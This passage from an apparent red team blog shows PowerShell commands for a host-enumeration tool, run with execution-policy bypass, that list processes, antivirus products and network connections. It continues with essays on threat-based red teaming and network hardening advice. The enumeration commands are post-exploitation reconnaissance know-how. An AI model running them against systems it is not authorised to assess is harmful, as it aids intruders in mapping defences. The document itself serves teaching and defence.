-HTMLReport\n</code></pre> <p>Perform a quick \"sysinfo\" like check via the Get-SystemInfo function.</p> <pre><code>powershell -ep bypass -c Import-Module ./HostEnum.ps1; Get-SysInfo\n\nHOSTNAME : WIN7X64\nOS : Microsoft Windows 7 Enterprise Service Pack 1\nARCHITECTURE : 64-bit\nDATE(UTC) : 20180110132636\nDATE(LOCAL) : 20180110072636-06\nINSTALLDATE : 20160121100103.000000-360\nUPTIME : 0 Days, 0 Hours, 47 Minutes, 55 Seconds\nIPADDRESSES : fe80::b59e:1735:dddf:d132%11, 192.168.15.10\nDOMAIN : WORKGROUP\nUSERNAME : User\nLOGONSERVER : \\WIN7X64\nPSVERSION : 2.0\nPSSCRIPTBLOCKLOGGING : Enabled\nPSTRANSCRIPTION : Disabled\nPSTRANSCRIPTIONDIR :\n</code></pre> <p>I highly recommend utilizing the -HTMLReport switch whenever possible as this is the best way to view the resulting data. Alternatively you could execute any command and pipe to Out-String and Set-Content to redirect the console output if you just want text. You can still monitor execution status with the -Verbose switch.</p> <pre><code>powershell -ep bypass -c Import-Module ./HostEnum.ps1; Invoke-HostEnum -Verbose -All | Out-String | Set-Content $env:USERPROFILEresults.txt\n\nVERBOSE: Performing quick enumeration...\nVERBOSE: Enumerating running processes...\nVERBOSE: Enumerating installed AV product...\nVERBOSE: Enumerating potential AV processes...\nVERBOSE: Enumerating active network connections...\nVERBOSE: Enumerating current user local group membership...\n</code></pre>"},{"location":"blogs/2018/hostenum-updates-usage/#wrap-up","title":"Wrap-Up","text":"<p>I'm always looking for ideas of new enumeration techniques and data to capture so please feel free to make comments and suggestions on the GitHub repo or contact me at @andrewchiles on Twitter. Try HostEnum on an upcoming engagement and let me know what other information would be useful to you regarding the environments you encounter.</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/","title":"Threat Gets A Vote: Applying a Threat-Based Approach to Security Testing","text":"<p>Joe Vest | June 04, 2018 | Tweet This Post: </p> <p>Designing, deploying, and managing a comprehensive security program is not an easy task. An organization's security design is influenced and pressured from multiple, often competing, sources. This includes customers, compliance, management, peers, budget, public opinion, and news. This process is complex and challenging, but an organization is generally able to overcome the pressures and implement what is considered to be a robust security program. An organization is able to please the various parties and, at least on paper, describe a strong security program designed to stop malicious cyber-attacks. Audit and compliance checks pass with a green light. Robust patch management systems are deployed. Vulnerability assessments and penetration tests are conducted. In general, the organization has good security hygiene. These are all great steps in defending a network from attack, but unfortunately, often fall short in achieving the primary goal of preventing, detecting, and responding to real threats. Why? What is missing? The real question to consider is:</p> <p>Are organizations really building security programs designed to address the threat?</p> <p>This post dives into the shortcomings of security operations design, implementation, and testing and how applying a threat-based security testing program can reduce these gaps to ultimately improve the state of security.</p> <p>A security program includes many components; staff, policy, tools, management, oversight, incident response to name a few. The program is built by including members of several different divisions. Each contribute their security requirements to ultimately design and build the program. This is a great, but what, or better who, is often missing from this strategy? Has anyone on the team ever seen a bad guy?</p> <p></p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#is-the-threat-really-included-in-security-planning","title":"Is the threat really included in security planning?","text":"<p>Good intentions by a group of intelligent people do not add up to understanding threats or how they operate. If the goal of security operations is to prevent, detect, respond, and recover to malicious actions, it only makes sense to include the opinions of those who you are defending against.</p> <p>Unfortunately, the threat or threat perspective is often excluded from security design. This omission can lead to the mitigation or acceptance of risks not fully understood or revealed from traditional security testing and auditing. This can lead to a serious false sense of security. A real threat knows this and uses it to their advantage.</p> <p>Consider the following. Does a threat know a target has a robust security program? Do threats perform actions that will trigger an alert or get them caught? Are threats still successful? If so, why are threats able to successfully achieve their goals and negatively impact an organization that has a comprehensive security program? To understand this, we need to know what we are defending against.</p> <p>The security industry uses the term threat, but...</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#what-is-a-threat","title":"What is a threat?","text":"<p>Dictionary.com1 defines threat as:</p> <ol> <li>a declaration of an intention or    determination to inflict punishment, injury, etc., in retaliation for, or    conditionally upon, some action or course; menace</li> <li>an indication or warning of probable    trouble</li> <li>a person or thing that threatens.</li> </ol> <p>ISO 270012 defines threat as:</p> <ol> <li>A potential cause of an incident, that may result in harm of systems and organization</li> </ol> <p>NIST3 defines threat as:</p> <ol> <li>Any circumstance or event with the potential to adversely impact organizational operations (including mission, functions, image, or reputation), organizational assets, individuals, other organizations, or the Nation through an information system via unauthorized access, destruction, disclosure, modification of information, and/or denial of service.    |</li> </ol> <p>To summarize and keep this in context of cybersecurity, a threat is an event that has the potential to adversely impact an organization. Is this what security operations is defending against? A negative event? Perhaps, but consider including the term threat-actor when using threat. A threat-actor is the person or group of people behind an attack. A solid defensive strategy must defend against the intelligent threat-actor bent on causing damage to an organization, and not just a potential event. People are behind cyber-attacks. When the defense considers the tactics, techniques, and procedures (TTPs) of intelligent threat-actors, they begin to truly understand the real threat. Defenders can then implement security defenses that directly impact the ability a threat-actor has to perform negative actions. Shifting security operations from the mindset of \"Vulnerable\" or \"Not Vulnerable\" and adopting an approach that focuses on threat actions will significantly improve the ability an organization has to not only prevent but also detect and respond to real threats. This is the beginning of understanding security through the eyes of the threat. Organizations who use threat actions to drive their defensive TTPs can make life very difficult for threat-actors and even protect themselves against unknown or zero-day attacks.</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#why-do-threats-succeed","title":"Why do Threats Succeed?","text":"<p>Many organization's currently use audit and compliance, vulnerability assessments, and penetration testing to evaluate and measure risk to cyber-attack. Why bother with a new threat focused approach?</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#isnt-the-identification-and-mitigation-of-vulnerabilities-enough","title":"Isn't the identification and mitigation of vulnerabilities enough?","text":"<p>In order to answer, you must understand how a threat-actor thinks and acts. Remember, a threat is really an intelligent person bent on causing harm. It is NOT an exploit of a vulnerability, NOT a piece of malware, or NOT a phishing attack. These are merely means a threat-actor may choose to use to achieve their end goal. The threat-actor knows the target has a comprehensive security program. A suite of security tools (firewalls, intrusion detection systems, anti-virus, EDR, etc) are deployed with the intent of stopping cyber-attacks. A good threat-actor knows this and will most likely assume patches are deployed and vulnerability assessments and penetration tests are performed. This understanding can significantly change the actions taken by a threat-actor compared to the actions taken by a traditional security tester. Does the threat-actor fire up a port scanner and enumerate an entire network? Does a threat-actor fire up vulnerability scanning tool to find an exploit? Attacks by threat-actors do not always follow the models adopted by traditional security testing. An attack is not scan -&gt; exploit -&gt; profit. An intelligent threat-actor evaluates what a target presents and uses weakness not always discovered through traditional security tests. The threat-actor will take a number of controlled steps to gain access to a target, establish command and control, establish persistence, and ultimately achieve their desired goal. The people charged with defending an organization often ignore or misunderstand the steps taken by a threat-actor. This often leads to focus on prevention, not detection. Defenders who do focus on detection may drown themselves in un-actionable default or vendor generate logs and alerts. Have you ever heard from the defending team \"We have too many logs and alerts to respond!\"? Why do organizations log what they log? Compliance? In case they are needed? Vendor advice? Organizations are still missing a key piece to all threats; understanding their actions and TTPs.</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#consider-this-scenario","title":"Consider this scenario","text":"<p>After evaluating a target network, a threat-actor decides phishing is their chosen method to gain access. A phish is sent to a small number of people. The phish contains an excel attachment with a DDE4 based attack. An email recipient opens the attachment, malicious code is executed on the target, and command and control (C2) is established. The threat-actor then performs a series of steps that includes situational awareness of current access, enumeration of potential new targets, and lateral movement options to those targets. In this case, the threat finds clear text database credentials on a old test web application backup in a public share. The credentials are used to laterally move to a test database server. Code execution on the database server provides elevated access. The situational awareness cycle repeats. The threat-actor discovers elevated credentials stored in memory on the database server. Credential material is extracted from a Windows domain controller using the stolen elevated database credentials. The threat-actor performs additional situational awareness and enumeration using the new credentials from the domain controller. The intended target is identified and is located on a sensitive file repository. Using the elevated access and C2 channels, the threat-actor achieves their final objective and exfiltrates sensitive data outside the network.</p> <p>Is this scenario reasonable? Were opportunities presented to detect or prevent the threat? Organizations often blame the end user who clicked the link. What about the actions taken after the initial click? This scenario indicates an organization's entire security model may depend on users not clicking a link in an email. The organization does not intend to hinge all security on a single user, but the actions taken to defend their systems often say otherwise.</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#why-is-this-scenario-successful","title":"Why is this scenario successful?","text":"<p>Organizations often have the wrong mindset to security defense</p> <ul> <li>Users are blamed for clicking links</li> <li>Policies, procedures, and compliance measure security</li> <li>Log everything (You never know what you need)</li> <li>Patch, patch, patch. Threats only use exploits</li> <li>Our security tools will save use</li> </ul> <p>These can be valuable actions that reduce the attack surface, but an intelligent threat-actor knows this. Instead of only focusing on actions that impact the attack surface, organizations need to include a focus on threat TTPs. This does not mean focusing on a specific threat-actor. Whether the threat-actor is script kiddie or an APT, both will execute a series of steps (TTPs) to impact an organization. This is the key. Focusing on defending against TTPs combined with good security practices that reduce the attack surface is the most effective way to directly impact a threat-actor's ability to operate.</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#a-threat-will","title":"A Threat Will\u2026","text":"<p>To keep it simple, a threat-actor must Get-In to establish an initial foothold. This phase is generally quick, but defenders place heavy focus here. They must Stay-In by establishing command and control (C2). This is the phase where the threat maintains influence over the target. Actions may include persistence, target identification, lateral movement, and privilege escalation. The Stay-In phase provides the most opportunity to detect or impact a threat, but is often ignored or misunderstood. Finally, the threat-actor will Act or perform the actions that reflect why they attacked if the first place. Keeping security simple can help defenders be focused an apply an intelligent defense strategy instead of defending everything at once.</p> <p>A threat-based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming.</p> <p>Definition of Red Teaming</p> <p>Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment.</p> <p>In other words, red teaming is the process of emulating a threat using real threat techniques with the goal of training blue teams and/or measuring security operations as a whole.</p> <p>Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target.</p> <p>Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT.</p> <p></p> <p>Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessment are good at reducing the attack surface but do not provide much detail in terms of organizational risk.</p> <p>Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target's attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat's ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization's operations or how security operations was able to impact a threat's ability to operate.</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#pdrr-protect-detect-respond-recover-coverage","title":"PDRR (Protect, Detect, Respond, Recover) Coverage","text":"<p>The NIST CyberSecurity Framework6 has guidance for improving critical infrastructure cybersecurity. According to NIST: The Framework provides a common taxonomy and mechanism for organizations to:</p> <ol> <li>Describe their current cybersecurity posture;</li> <li>Describe their target state for cybersecurity;</li> <li>Identify and prioritize opportunities for improvement within the context of a continuous and repeatable process;</li> <li>Assess progress toward the target state;</li> <li>Communicate among internal and external stakeholders about cybersecurity risk.</li> </ol> <p>The core of the framework presents industry standards, guidelines, and practices in a manner that allows for communication of cybersecurity activities and outcomes across an organization from the executive level to the operations level. The core consists of five functions\u2014Identify, Protect, Detect, Respond, Recover. The functions provide a high-level, strategic view of an organization's management of cybersecurity risk. The framework then identifies underlying key categories and subcategories for each function, and matches them with example informative references, such as existing standards, guidelines, and practices for each subcategory.</p> <p>For more details, visit https://www.nist.gov/cyberframework/cybersecurity-framework-faqs-framework-components.</p> <p>What does this mean for Red Teaming? Let's focus on how red teaming can be used by an organization to measure its ability to Protect, Detect, Respond, and Recover against a threat.</p> <ul> <li>Protect \u2013 The Protect function supports the ability to limit or contain the impact of a potential cybersecurity event.</li> <li>Detect \u2013 The Detect function enables the timely discovery of cybersecurity events.</li> <li>Respond \u2013 The Respond function supports the ability to contain the impact of a potential cybersecurity incident.</li> <li>Recover \u2013 The Recover function supports timely recovery to normal operations to reduce the impact from a cybersecurity incident.</li> </ul> <p>Red teaming allows an organization to explore a wide range of threat activity. This provides the stimulation required to engage security operations as a whole. Red teaming engages an organization's security operations (Blue Team) and exercises Blue TTPs through protection, detection, response, and recovery from a threat. Vulnerability assessments and penetration testing are generally more limited and typically only engage protection and some detection.</p> <p>The following illustrates the PDRR coverage of different assessment types.</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#_1","title":"Threat Get's a Vote - Applying a Threat-Based Approach to Security Testing","text":"<p>When an organization is ready to understand the negative impacts caused by a threat-actor, a professional red team is used to provide the required threat emulation and stimulus. A professional red team has the ability to emulate a threat-actors TTPs in order to stimulate and engage security defenders against a realistic threat. Red teams may identify vulnerabilities and exploits, but these are only a means to an end. Red teams focus on engagement goals. This engages an organization with a realistic attack to better understand how they are able to impact a threat's ability to operate or cause negative impacts to the organization.</p> <p>Red teams can emulate realistic TTPs through research and experience. Much of this information has been complied in to a framework (ATT&amp;CK) and organizations can use this to help measure their ability to defend against specific TTPs. MITRE's Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;CK\u2122)7 is a knowledge base and model for cyber threat behavior. ATT&amp;CK is useful for understanding security risk against known threat behavior, for planning security improvements, and verifying defenses work as expected. ATT&amp;CK can be thought of a menu of TTPs. Red teams can use this to ensure they have a comprehensive set of threat TTPs, and blue teams can use this to build a scorecard of how well they are able to defend against the various TTPs.</p> <p></p> <p>ATT&amp;CK is broken into Tactics, Techniques, and Procedures. Tactics are the tactical goals a threat may use during an operation. Techniques describe the actions threats take to achieve their objectives. Procedures are the technical steps required to perform the action. This provides a classification of all threat actions regardless of the underlying vulnerabilities. Security operations can use this as a roadmap or scorecard to measure the ability to protect, detect, respond, and recover from a threat.</p> <p>Security program development should include the threat during design and development. Organizations should continue to build and manage a comprehensive security program designed to reduce the attack surface; however, must include Blue TTPs that directly impact the threat. Organizations should use red teams to provide threat faithful stimulus to train blue teams or measure security operations as a whole. Simple measurements are often missed in traditional security testing, but are core to red team engagements. Red teaming can provide answers to question like;</p> <p>Questions</p> <p>_ What ability does a threat have to laterally move throughout a network? _ What ability does a threat have to escalate privileges? _ What ability does a threat have to exfiltrate sensitive data? _ Can a threat degrade, disrupt, deny, or destroy operations?</p> <p>In addition to these simple questions, red teams and blue teams can use the MITRE ATT&amp;CK Framework as a tool to measure blue's ability to defend against threat TTPs.</p>"},{"location":"blogs/2018/threat-gets-a-vote-applying-a-threat-based-approach-to-security-testing/#references","title":"References","text":"<ol> <li>Threat Definition, Dictionary.com, http://www.dictionary.com/browse/threat</li> <li>Threat Definition, ISO 27001, http://www.praxiom.com/iso-27001-definitions.htm#Threat</li> <li>Threat Definition, NIST, https://csrc.nist.gov/Glossary/?term=2156</li> <li>Reviving DDE: Using OneNote and Excel for Code Execution, https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee</li> <li>NIST Cybersecurity Framework, https://www.nist.gov/cyberframework/csf-reference-tool</li> <li>MITRE ATT&amp;CK Framework, https://attack.mitre.org/wiki/Main_Page</li> </ol>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/","title":"Threat Mitigation Strategies: Observations and Recommendations","text":"<p>James Tubberville | January 25, 2018 | Tweet This Post: </p> <p>Full disclosure: This post is heavy on text. Much of the content is very broad and uses simplified examples. There are literally thousands of extremely cool and interesting ways to limit threat activity; however, I've decided to simplify and focus on those that could have the most significant impact with relatively easy implementation. Enjoy!</p> <p></p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#topic","title":"Topic","text":"<p>While much of the world talks of protecting against an Advanced Persistent Threat (APT), in reality nearly all organizations and networks have an extremely hard time protecting against basic (or dare I say novice?) threats. I've been wanting to write a full white paper on the topic, but can't seem to find the time. Rather, I've decided to summarize my experience into a short series. The first in this series provides an introduction divided into three categories: general problem sets, observations, and recommendations. Follow-on post in the series will provide the technical detail (or \"how to\") for each of the recommendations.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#background","title":"Background","text":"<p>Over the years my team has performed numerous evaluations against a variety of networks. These evaluations attempted to extend beyond the simple enumeration of potential vulnerabilities (i.e. patches, updates and compliance measures) by reviewing the actions of real-world cyber based threats and attacks. Each assisted in determining the true risk associated with actions performed by a knowledgeable and determined threat. Each evaluation focused on these realistic risk profiles rather than focusing on ephemeral vulnerabilities.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#threat-synopsis","title":"Threat Synopsis","text":"<p>For those unfamiliar with threat operations, I think it is important to annotate the simplified set of threat actions commonly performed in a network prior to identification of problem sets, observations and recommendations.</p> <p>So, what does an example attack path look like?</p> <p>A threat typically gains access to an externally facing system or service (commonly in a DMZ) that is, in most instances, managed by the internal domain (not a true DMZ). The second method of access involves targeting internal client workstations by phishing, web drive-by, or some other form of social engineering.</p> <p>Once a threat has gained initial access, they leverage various lateral movement techniques to traverse the network away from the initial foothold. At this stage, a threat commonly establishes a method for command and control (C2) and persistence. C2 is simply the influence a threat has over a system to which access has been achieved. Persistence is simply a method for re-establishing or regaining access to C2. The established C2 and continued lateral movement enables the discovery of additional systems, interesting files, and potential paths to a target. The target is the information, system, person or process for which the threat is attempting to access. The threat re-evaluates each pivot through the network looking for these items and for methods of privilege escalation.</p> <p>In real-world scenarios, this stage is when the threat finds elevated account credentials stored in a file or pulls tokens and credentials from memory; however, there are also numerous methods for leveraging applications and services to gain elevated access. Threats repeat this process until privileges have been escalated to that of a Domain Administrator (DA) or higher.</p> <p>Once escalation is achieved, the threat most often targets a server, commonly the Domain Controller (DC). The DC communicates with and controls virtually everything within a windows based network. At this stage, the threat often has access to the target and can perform information collection and impacts as desired. In short, it's usually game over for the target.</p> <p>Although this simplification identifies a Windows based network. It is also important to understand that access to a server, DC, or directory services may not be a requirement for access or impact to the target; however, it is more often than not a major enabler.</p> <p>This synopsis simply demonstrates that most threat attack paths follow the same principles of getting in, staying in and acting regardless of the tools, techniques, and procedures (TTPs), or motivators.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#problem-sets","title":"Problem Sets","text":"<p>As IT and security professionals, we must understand that \"security\" isn't what we should strive towards. Our purpose is to enable the objectives, functions, sustainment and success of the businesses and systems we support. Rather than forcing the concepts of \"security\", we should be identifying and communicating how our efforts support those basic business requirements and provide solutions to existing (and potential) problems to business success. In this article, I'm focusing on those security problems in which most IT and security staff directly influence. Although every organization has it's own unique set of problems, there is a clear commonality that all lead to four root causes.</p> <p>Consider This</p> <p>Anyone has the ability to influence any aspect of the organization regardless of their position!</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#compliance-does-not-equate-to-security","title":"Compliance does not equate to security","text":"<p>Given the general construct of how a threat's actions might leverage a network's architecture, simply meeting compliance requirements does little to enable the prevention or detection of threat actions. Across the board, compliance has been set as the bar of achievement when, in reality, compliance is the absolute minimum set of controls, policies and procedures that should be enforced. Don't misunderstand the concept. Compliance is absolutely a requirement and does much for the general security posture of a system or network. However, I've tested hundreds of systems and networks that (at least on paper) were fully compliant with their required standard, but failed to adequately protect the business and associated functions/information.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#partial-implementation-of-security-controls-enable-a-threat","title":"Partial implementation of security controls enable a threat","text":"<p>Of the compliance measures employed, many are only partially implemented. One example observed in every effort to date are remote management capabilities. Most Windows Firewall requirements state unsolicited inbound connections must be blocked; however, in each evaluation all hosts tested were able to send and receive connections to/from other devices on the network. Although a firewall was installed and active, it allowed connections via multiple ports, protocols and services (PPS). While this is a single example, it emphasizes the methods in which compliance measures are only partially implemented.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#tools-are-only-enablers","title":"Tools are only Enablers","text":"<p>Another commonality across the board is an over reliance on tools to perform prevention and detection activities. Our industry dedicates large amounts of valuable resources to the development or purchase of systems and software (tools) that provide little value in the overall security of a network. Many of these tools have been in use or development for multiple years and have undergone numerous reviews; however, few have been successful in thwarting real-world threats. In fact, many of the tools deployed to date have been easily bypassed, detected or leveraged by knowledgeable threats. Tools are enablers. They provide a cognizant human with the information required to make an intelligent decision.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#policies-and-procedural-nightmares","title":"Policies and Procedural Nightmares","text":"<p>Cumbersome policies and procedures elongate the process for implementing timely and effective defensive mitigations. All interviewed system, network and defensive staff identified longstanding issues with receiving approval to implement change and the timeliness of any approvals received. This concern has been relayed throughout the industry for years. If policy and procedures are primary inhibitors to the successful defense of our networks, policy and procedures must be modified to accommodate the need.</p> <p>If detailed, the number of existing problem sets, vulnerabilities, and operational requirements far exceed any realistic ability to read, digest and act in a timely manner. The four problem sets listed above are of high importance as they are the foundation to all other sets. Each organization must begin addressing methods for limiting a threat's actions without increasing complexity, impacting the way in which systems and networks operate by design (user work-flow), or chasing ephemeral vulnerabilities. I'm left asking myself, why would we (the IT and security community) continue down the same ineffective paths, but continuously expect different results?</p> <p>While meeting compliance requirements does have an extremely valuable effect on security, the next section provides recommendations that would benefit any organization far more.</p> <p>Each of the observations and recommendations are the result of many, many efforts. The recommendations can be applied to any and all networks. Some networks will have exceptions; however, these are exceptions (not the status quo) and should be handled as such.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#client-to-client-communication","title":"Client-to-client communication","text":"<p>Clients rarely need to communicate amongst themselves. Over a roughly eighteen-year period and hundreds of various networks, less than a handful of architectures have had requirements for client-to-client communication (most due to application design failures/features).</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations","title":"Observations","text":"<p>Of the systems and networks evaluated in recent years, none have required client-to-client communications. In fact, most have already implemented some type of host-based firewall. Yet in every network evaluated to date, all have been configured to allow client-to-client communication. Often the systems, network and defensive teams were unaware that such communications were allowed. In other instances administrative functions were identified as reasons for allowing communication.</p> <p>Example: During review, each network staff identifies that host-based firewalls have been implemented; however, initiating a connection to other clients using multiple ports and protocols has always been successful. Most often the staff cite requirements for system and network administration using Server Message Block (SMB), Remote Desktop Protocol (RDP) or another Remote Administration Tool (RAT). In several instances, security tools were also identified as reasoning for allowing client-to-client communications.</p> <p>Note</p> <p>There are multiple methods of allowing communications for administrative purposes only when required and should never be allowed perpetually.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-prevent-client-to-client-communication","title":"Recommendation: Prevent client-to-client communication","text":"<p>Simply implement and configure host and network based firewalls, IPTables, Access Control Lists (ACLs), etc. Leverage any and all capabilities of the network and organization. Preventing these communications limits a threat's ability to move freely throughout the network, reduces the likelihood of privileged account discovery, forces an increase in time and effort (more activities and artifacts), and therefore can increase the defender's ability to detect.</p> <p>Note</p> <p>Effective configuration of host based firewalls requires a thorough understanding of what network traffic should occur (what does normal look like?).</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#server-to-client-communication","title":"Server-to-client communication","text":"<p>Most client-server designs require a client to request information from a server. Experience has provided few instances where a server should initiate communications to a client.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_1","title":"Observations","text":"<p>Of the networks evaluated, none have required server-to-client communications. Yet in every network evaluated to date, all have been configured to allow server-to-client communication. A common threat action is to leverage a server's ability to communicate with clients or segments to move through a network. This often allows the threat to access targets or bridge network segments even when segmentation has been properly implemented.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-prevent-server-to-client-communication","title":"Recommendation: Prevent server-to-client communication","text":"<p>Assuming the network has prevented client-to-client communications, the only option a threat has is to attempt access to a server. Given this scenario, it is more than feasible to limit a server's ability to initiate communications with a client. This recommendation limits the threat's ability to move from workstation, to a server and back to another workstation. When connections to clients are attempted, those should stand out as indicators of malicious activity.</p> <p>The most common IT staff concern with this implementation is malfunctioning or broken clients. This is a perfect example of where security implementations assist with the overall health of the network. If a client cannot initiate communications with the server, the client has other issues. This should be cause for investigation and correction rather than simply forcing connections from the server.</p> <p>Another common concern is the ability to \"push\" software, updates, etc. from the server. This is another instance where best practices are not being followed. A client should always request from a server. If deploying software or updates, the client should be notified when communicating with the server (via policy, configurations, etc.) and pull the respective requirements.</p> <p>Note</p> <p>In this context, a server is a functional role rather than a type of device.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#outbound-server-communications","title":"Outbound Server Communications","text":"<p>With very few exceptions, servers should never call outside the network.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_2","title":"Observations","text":"<p>Of the networks evaluated, all have had servers that allow communication with external (non-organizational) systems. This communication allows a threat to exfiltrate data directly from a server in which it has gained access. It also allows data restricted to certain network segments to be moved through a server and out of the network, often without detection.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-block-outbound-server-communications","title":"Recommendation: Block outbound server communications","text":"<p>There are few instances where a server needs to communicate with a system external to the network. These are exceptions and should be managed to allow only connections to the required external asset or IP and allow only the use of required ports and protocols. All other outbound communications from servers should be blocked. This implementation combined with the limits between clients and server-to-client exponentially increases the difficulty of lateral movement and command and control.</p> Should your internal Domain Controller manage the server in the DMZ? <p>Of course not, but how many organization effectively control communication paths?</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#cached-administrative-credentials","title":"Cached administrative credentials","text":"<p>Cached credential discovery is a common and primary method in which threats escalate privileges. Cached credentials are simply credentials temporarily stored for use by the system in which they reside. When administrative access for the current activity or session ends, the cached credential is no longer required.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_3","title":"Observations","text":"<p>Of the networks evaluated, all have had cached administrative credentials present. These credentials are stored in memory when system and network administrators perform maintenance functions, when helpdesk personnel perform user support and when a tool is used to perform an automated task. This is a common problem on virtually all networks and the reason why a threat will leverage this functionality.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-clear-cached-administrative-credentials","title":"Recommendation: Clear cached administrative credentials","text":"<p>Clearing credentials is relatively easy to do, yet is not often done. A few simple registry changes and requiring administrators to reboot (mainly workstations/clients) after using elevated accounts is a great step forward in limiting cached credentials. Also, forcing the use of Remote Desktop Credential Guard and Restricted Admin (see client-to-client above) has proven to be helpful in limitations; however, depending upon function, there may still be cached credentials present. It is recommended to always reboot after administrative functions.</p> <p>Note</p> <p>There are also several methods for injecting invalid credentials into memory for use as indicators. These HoneyTokens can be used as indicators of malicious activity.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#krbtgt-domain-kerberos-account","title":"KRBTGT (Domain Kerberos Account)","text":"<p>By now most have heard of Golden Tickets (GT) and Silver Tickets (ST) created via the domain KRBTGT (Domain Kerberos) account's NTLM hash. These tickets can be valid for extremely long periods of time and allow access to domain resources even after administrative credentials have been changed.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_4","title":"Observations","text":"<p>Although many security professionals understand the GT/ST concept, most standard IT staff either don't know or are unclear on how they work. Many of the organizations evaluated have never reset the KRBTGT account. Of the few that have, many only reset once. This first reset does change the credential; however, the initial reset also creates a \"backup\". Due to this functionality, the KRBTGT account must be reset twice to flush old credentials completely. Only after the second reset are existing Golden and Silver Tickets rendered useless.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-reset-the-krbtgt-account","title":"Recommendation: Reset the KRBTGT Account","text":"<p>Reset the KRBTGT account twice within a limited time-frame (36-48 hours apart is recommended) followed by the changing of all administrative credentials. These resets limit a threat's ability to maintain access after credential changes. The administrative credential change is highly recommended and should be required. If the threat has a valid GT they have obtained valid credentials. A new Golden Ticket can be created after the KRBTGT reset if credentials have not been changed (defeating the purpose of the KRBTGT reset). This process should be completed periodically (no less frequently than quarterly).</p> <p>Note</p> <p>Anyone using assets not on the network during the resets (traveling, out of office, etc.) will likely need help authenticating when reconnecting.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#sensitive-items","title":"Sensitive Items","text":"<p>Sensitive items include credentials, configuration files, Privacy of Information Act (PIA) data, Intellectual Property, anything close-hold or critical to business operations, etc.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#observations_5","title":"Observations","text":"<p>In every network evaluated, multiple instances of sensitive items were discovered. Items were found in many different locations to include organizational file shares, personal file shares, workstation directories, server directories, organizational websites and often on external (non-organizational) websites. More often than not, they are available to anyone with access to the network. These items provide the threat either the information for the target or the information required to obtain access to the target.</p>"},{"location":"blogs/2018/threat-mitigation-strategies-observations-recommendations/#recommendation-perform-a-sensitive-items-review","title":"Recommendation: Perform a sensitive items review","text":"<p>Perform frequent search and discovery activities for critical items stored across the network and network systems. With the exception of credential storage, there are legitimate reasons for storing information such as configurations, diagrams, business information, etc. on the network. These need special focus to determine where they are stored, who has access and if they have any authenticators or credentials.</p> <p>Challenge: Perform a string search for \"pass\", \"assw\", \"pwd\", \"key\", and 